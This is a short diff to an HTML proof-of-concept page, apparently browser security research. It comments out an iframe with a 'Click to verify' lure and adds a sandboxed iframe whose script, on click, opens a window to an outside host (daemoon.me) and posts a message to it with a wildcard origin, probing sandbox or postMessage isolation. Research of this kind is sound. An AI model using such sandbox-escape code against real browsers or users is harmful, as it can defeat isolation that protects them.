@@ -8,7 +8,7 @@
 <body>
     <h1>POC</h1>
 
-    <iframe sandbox="allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox" srcdoc="
+    <!-- <iframe sandbox="allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox" srcdoc="
         &lt;button id='go'>Click to verify&lt;/button>
         &lt;script>
             document.getElementById('go').addEventListener('click', function() {
@@ -23,7 +23,9 @@
                 }, 3000);
             });
         &lt;/script>
-    "></iframe>
+    "></iframe> -->
+
+    <iframe sandbox="allow-scripts allow-popups" srcdoc='<script>function r(){var j = window.open("//daemoon.me/test.html"); setTimeout(()=>{j.postMessage("asdf", "*")}, 1000)};window.onclick=r</script>Click Me'></iframe>
 
 </body>
 </html>
